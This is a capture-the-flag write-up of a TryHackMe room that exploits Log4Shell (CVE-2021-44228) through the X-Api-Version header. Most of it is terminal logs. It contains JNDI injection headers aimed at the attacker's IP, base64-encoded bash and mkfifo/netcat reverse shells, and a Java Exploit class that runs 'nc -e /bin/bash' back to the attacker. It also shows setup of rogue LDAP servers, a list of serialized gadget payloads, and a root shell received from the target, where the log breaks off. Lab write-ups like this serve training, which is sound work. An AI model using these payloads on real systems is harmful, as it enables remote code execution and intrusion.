# Lumberjack Turtle — Writeup

## Overview
### Lumberjack Turtle — Writeup
### Lumberjack Turtle — Writeup
----
No logs, no crime... so says the lumberjack.
----
![](https://www.honeytokens.io/img/LumberjackTurtle.png)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/89ef3c44b9b2c745aeee7fda1498e483.png)
Start Machine
Deploy the machine. Wait **7 minutes** for everything to startup.
(go get a cup of _java_ ☕ or something)
Answer the questions below
Target is up. Time to recon...
Correct Answer
### Task 2  Challenge
([root does a body good. pass it on](https://www.youtube.com/watch?v=Zy63_nKaoy8))
What do lumberjacks and turtles have to do with this challenge?
Hack into the machine. Get root.  You'll figure it out.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.82.254 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.82.254:22
Open 10.10.82.254:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.82.254 [2 ports]
Discovered open port 22/tcp on 10.10.82.254
Discovered open port 80/tcp on 10.10.82.254
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.82.254
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.82.254.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.82.254
Host is up, received user-set (0.21s latency).

PORT   STATE SERVICE     REASON  VERSION
22/tcp open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6aa12d136c8f3a2de3ed84f4c7bf2032 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCnZPtl8mVLJYrSASHm7OakFUsWHrIN9hsDpkfVuJIrX9yTG0yhqxJI1i8dbI/MrexUGrIGzYbgLpYgKGsH4Q4dxB9bj507KQaTLWXwogdrkCVtP0WuGCo2EPZKorU85EWZAhrefG1Pzj3lAx1IdaxTHIS5zTqEJSZYttPF4BHb2avjKDVfSA+4cLP7ybq0rgohJ7JLG5+1dR/ijrGpaXnfudm/9BVjiKcGMlENS6bQ+a32Fs7wxL5c7RfKoR0CjA+pROXrOj5blQM4CI4wrEdphPZ/900I4DJ+kA6Ga+NJF6donQOmmhjsEEpI6RYcz6n/4ql1bomnyyI+jayyf3t
|   256 1dac5bd67c0c7b5bd4fee8fca16adf7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBPkLzZd9EQTP/90Y/G1/CYr+PGrh376Qm6aZTO0HZ7lCZ0dExE834/QZ1vNyQPk4jg1KmS09Mzjz1UWWtUCYLg=
|   256 13ee5178417e3f543b9a249b06e2d514 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdrmxj3Q5Et6BwEm7pC8cz5louqLoEAwNXGHi+3ee+t
80/tcp open  nagios-nsca syn-ack Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.43 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.82.254 -w /usr/share/wordlists/dirb/common.txt                        
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.82.254
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.82.254/~logs                (Status: 200) [Size: 29]
http://10.10.82.254/error                (Status: 500) [Size: 73]
Progress: 4575 / 4615 (99.13%)
===============================================================
 Finished
===============================================================

No logs, no crime. Go deeper.

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.82.254/~logs -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.82.254/~logs
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.82.254/~logs/log4j                (Status: 200) [Size: 47]

Hello, vulnerable world! What could we do HERE?

Attackers can take advantage of it by just inserting a line of code like ${jndi:ldap://[attacker_URL]}

GET /~logs/log4j HTTP/1.1

Host: ${jndi:ldap://10.8.19.103:4444}

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

┌──(witty㉿kali)-[~/hackers_koth]
└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
10.10.82.254: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.82.254] 42880
0
0
0

uhmm

GET /~logs/log4j HTTP/1.1

Host: 10.10.82.254

User-Agent: ${jndi:ldap://10.8.19.103:4444}

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

HTTP/1.1 200 

X-THM-HINT: CVE-2021-44228 against X-Api-Version

Content-Type: text/html;charset=UTF-8

Content-Length: 47

Date: Sat, 08 Jul 2023 21:30:32 GMT

Connection: close

Hello, vulnerable world! What could we do HERE?

┌──(witty㉿kali)-[~/Downloads]
└─$ java -version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
openjdk version "17.0.6" 
OpenJDK Runtime Environment (build 17.0.6+10-Debian-1)
OpenJDK 64-Bit Server VM (build 17.0.6+10-Debian-1, mixed mode, sharing)

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo apt-get install maven

┌──(witty㉿kali)-[~/Downloads]
└─$ mvn -v                    
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Apache Maven 3.8.7
Maven home: /usr/share/maven
Java version: 17.0.6, vendor: Debian, runtime: /usr/lib/jvm/java-17-openjdk-amd64
Default locale: en_US, platform encoding: UTF-8
OS name: "linux", version: "6.1.0-kali5-amd64", arch: "amd64", family: "unix"

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/veracode-research/rogue-jndi
Cloning into 'rogue-jndi'...
remote: Enumerating objects: 80, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 80 (delta 8), reused 6 (delta 6), pack-reused 64
Receiving objects: 100% (80/80), 24.71 KiB | 301.00 KiB/s, done.
Resolving deltas: 100% (30/30), done.
                                                                                          
┌──(witty㉿kali)-[~/Downloads]
└─$ cd rogue-jndi 
                                                                                          
┌──(witty㉿kali)-[~/Downloads/rogue-jndi]
└─$ ls
LICENSE  pom.xml  README.md  src
                                                                                          
┌──(witty㉿kali)-[~/Downloads/rogue-jndi]
└─$ mvn package

[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  16.776 s
[INFO] Finished at: 2023-07-08T17:48:22-04:00
[INFO] ------------------------------------------------------------------------

┌──(witty㉿kali)-[~/Downloads/rogue-jndi/target]
└─$ ls
classes            maven-archiver  original-RogueJndi-1.1.jar
generated-sources  maven-status    RogueJndi-1.1.jar
                                                                                          
┌──(witty㉿kali)-[~/Downloads/rogue-jndi/target]
└─$ cd ..    
                                                                                          
┌──(witty㉿kali)-[~/Downloads/rogue-jndi]
└─$ ls
dependency-reduced-pom.xml  LICENSE  pom.xml  README.md  src  target

┌──(witty㉿kali)-[~/Downloads/rogue-jndi]
└─$ echo 'bash -c bash -i >&/dev/tcp/10.8.19.103/4444 0>&1' | base64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuOC4xOS4xMDMvNDQ0NCAwPiYxCg==

┌──(witty㉿kali)-[~/Downloads/rogue-jndi/target]
└─$ java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuOC4xOS4xMDMvNDQ0NCAwPiYxCg==} | {base64,-d}|{bash,-i}" --hostname "10.8.19.103" 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.8.19.103:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.8.19.103:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.8.19.103:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.8.19.103:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.8.19.103:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.8.19.103:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.8.19.103:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.8.19.103:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 4444                                      
listening on [any] 4444 ...

uhmm another way

_This is how it works_

1. When we send the payload `${jndi:ldap://attackerserver:1389/Exploit}` - it reaches out to our LDAP server .
2. The LDAP server forwards the request to our secondary server asking for the resource located at `http://attackerserver:8000/Exploit` .
3. Secondary server serves the `Exploit.class` file.
4. After retreiving , `the victim_server executes the code present in Exploit.class` (which is basically a reverse shell)
5. Once it executes , we get a reverse shell back on our netcat .

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/mbechler/marshalsec.git     
Cloning into 'marshalsec'...
remote: Enumerating objects: 176, done.
remote: Counting objects: 100% (48/48), done.
remote: Compressing objects: 100% (18/18), done.
remote: Total 176 (delta 35), reused 34 (delta 28), pack-reused 128
Receiving objects: 100% (176/176), 474.14 KiB | 1.63 MiB/s, done.
Resolving deltas: 100% (91/91), done.
                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cd marshalsec 
                                                                  
┌──(witty㉿kali)-[~/Downloads/marshalsec]
└─$ ls             
LICENSE.txt  marshalsec.pdf  pom.xml  README.md  src

witty㉿kali)-[~/Downloads/marshalsec]
└─$ mvn clean package -DskipTests

[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  55.467 s
[INFO] Finished at: 2023-07-08T18:00:15-04:00
[INFO] ------------------------------------------------------------------------

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.8.19.103:8000/#Exploit"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ cat Exploit.java 
public class Exploit 
{ 
	static { 
		try { 
			java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.8.19.103 9999"); 
			}
	catch (Exception e) 
			{ 
			e.printStackTrace(); 
			} 
		   } 
}

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ javac Exploit.java -source 8 -target 8
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
warning: [options] bootstrap class path not set in conjunction with -source 8
1 warning
                                                                                                          
┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ ls
archive-tmp    Exploit.java            marshalsec-0.0.3-SNAPSHOT-all.jar  maven-status
classes        generated-sources       marshalsec-0.0.3-SNAPSHOT.jar      test-classes
Exploit.class  generated-test-sources  maven-archiver

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ python3 -m http.server     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ rlwrap nc -lvp 4444  
listening on [any] 4444 ...

uhmm compiling with replit

┌──(witty㉿kali)-[~/Downloads]
└─$ mv Exploit.class /home/witty/Downloads/marshalsec/target/

 javac Exploit.java

 ls
Exploit.class  Main.class  replit.nix
Exploit.java   pom.xml     target

uhmm not work another way

https://github.com/christophetd/log4shell-vulnerable-app/blob/main/README.md

┌──(witty㉿kali)-[~/Downloads]
└─$ unzip JNDIExploit.v1.2.zip
Archive:  JNDIExploit.v1.2.zip
  inflating: JNDIExploit-1.2-SNAPSHOT.jar  
   creating: lib/
  inflating: lib/commons-beanutils-1.8.2.jar  
  inflating: lib/commons-beanutils-1.9.2.jar 

┌──(witty㉿kali)-[~/Downloads]
└─$ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.8.19.103 -p 8888
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...

uhmm another way

┌──(witty㉿kali)-[~/Downloads/JNDI-Exploit-Kit]
└─$ 
java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L "10.8.19.103:1389" -C "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyA5OTk5ID4vdG1wL2YK | base64 -d | bash"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
       _ _   _ _____ _____      ______            _       _ _          _  ___ _   
      | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |  
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_ 
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_ 
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|
                                           | |                                    
                                           |_|               created by @welk1n 
                                                             modified by @pimps 

[HTTP_ADDR] >> 10.8.19.103
[RMI_ADDR] >> 10.8.19.103
[LDAP_ADDR] >> 10.8.19.103
[COMMAND] >> echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyA5OTk5ID4vdG1wL2YK | base64 -d | bash
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://10.8.19.103:1099/ul0ewk
ldap://10.8.19.103:1389/ul0ewk
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://10.8.19.103:1099/1clb7e
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.8.19.103:1099/jyxqtq
ldap://10.8.19.103:1389/jyxqtq
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.8.19.103:1099/erzlut
ldap://10.8.19.103:1389/erzlut
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.8.19.103:1099/8eehjc
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.8.19.103:1099/jevuwo
ldap://10.8.19.103:1389/jevuwo

-------------------- LDAP SERIALIZED PAYLOADS -------------------- 

Payloads                                                     Supported Dynamic Commands                                      
--------                                                     --------------------------                                      
ldap://10.8.19.103:1389/serial/BeanShell1           exec_global, exec_win, exec_unix                                
ldap://10.8.19.103:1389/serial/C3P0                                                                                 
ldap://10.8.19.103:1389/serial/Clojure              exec_global                                                     
ldap://10.8.19.103:1389/serial/Clojure2             exec_global                                                     
ldap://10.8.19.103:1389/serial/CommonsBeanutils1    exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections1  exec_global, exec_win, exec_unix, sleep, dns                    
ldap://10.8.19.103:1389/serial/CommonsCollections10 exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections2  exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections3  exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections4  exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections5  exec_global, exec_win, exec_unix, sleep, dns                    
ldap://10.8.19.103:1389/serial/CommonsCollections6  exec_global, exec_win, exec_unix, sleep, dns                    
ldap://10.8.19.103:1389/serial/CommonsCollections7  exec_global, exec_win, exec_unix, sleep, dns                    
ldap://10.8.19.103:1389/serial/CommonsCollections8  exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CommonsCollections9  exec_global, exec_win, exec_unix, sleep, dns                    
ldap://10.8.19.103:1389/serial/Groovy1              exec_global                                                     
ldap://10.8.19.103:1389/serial/Hibernate1           exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/JBossInterceptors1   exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/JSON1                exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/JavassistWeld1       exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/Jdk7u21              exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/Jython1              exec_global                                                     
ldap://10.8.19.103:1389/serial/MozillaRhino1        exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/MozillaRhino2        exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/Myfaces1             exec_global                                                     
ldap://10.8.19.103:1389/serial/ROME                 exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/URLDNS               dns                                                             
ldap://10.8.19.103:1389/serial/Vaadin1              exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/Jre8u20              exec_global, exec_win, exec_unix, java_reverse_shell, sleep, dns
ldap://10.8.19.103:1389/serial/CustomPayload                                                                        

[+] By default, serialized payloads execute the command passed in the -C argument with 'exec_global'.

[+] The CustomPayload is loaded from the -P argument. It doesn't support Dynamic Commands.

[+] Serialized payloads support Dynamic Command inputs in the following format:
    ldap://10.8.19.103:1389/serial/[payload_name]/exec_global/[base64_command]
    ldap://10.8.19.103:1389/serial/[payload_name]/exec_unix/[base64_command]
    ldap://10.8.19.103:1389/serial/[payload_name]/exec_win/[base64_command]
    ldap://10.8.19.103:1389/serial/[payload_name]/sleep/[miliseconds]
    ldap://10.8.19.103:1389/serial/[payload_name]/java_reverse_shell/[ipaddress:port]
    ldap://10.8.19.103:1389/serial/[payload_name]/dns/[domain_name]
    Example1: ldap://127.0.0.1:1389/serial/CommonsCollections5/exec_unix/cGluZyAtYzEgZ29vZ2xlLmNvbQ==
    Example2: ldap://127.0.0.1:1389/serial/Hibernate1/exec_win/cGluZyAtYzEgZ29vZ2xlLmNvbQ==
    Example3: ldap://127.0.0.1:1389/serial/Jdk7u21/java_reverse_shell/127.0.0.1:9999
    Example4: ldap://127.0.0.1:1389/serial/ROME/sleep/30000
    Example5: ldap://127.0.0.1:1389/serial/URLDNS/dns/sub.mydomain.com

----------------------------Server Log----------------------------
 [JETTYSERVER]>> Listening on 10.8.19.103:8180
 [RMISERVER]  >> Listening on 10.8.19.103:1099
 [LDAPSERVER] >> Listening on 0.0.0.0:1389
 [LDAPSERVER] >> Send LDAP reference result for erzlut redirecting to http://10.8.19.103:8180/ExecTemplateJDK7.class
 [JETTYSERVER]>> Received a request to http://10.8.19.103:8180/ExecTemplateJDK7.class

┌──(witty㉿kali)-[~/Downloads]
└─$ curl 'http://10.10.174.76/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://10.8.19.103:1389/erzlut}'
Hello, vulnerable world! Did we get pwnage?  

┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ rlwrap nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.174.76] 33011
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4# which python
which python
bash-4.4# which python3
which python3
bash-4.4# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
bash-4.4# ls -lah /
ls -lah /
total 68
drwxr-xr-x    1 root     root        4.0K Dec 13  2021 .
drwxr-xr-x    1 root     root        4.0K Dec 13  2021 ..
-rwxr-xr-x    1 root     root           0 Dec 13  2021 .dockerenv
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 app
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 bin
drwxr-xr-x   12 root     root        3.4K Jul  9 00:46 dev
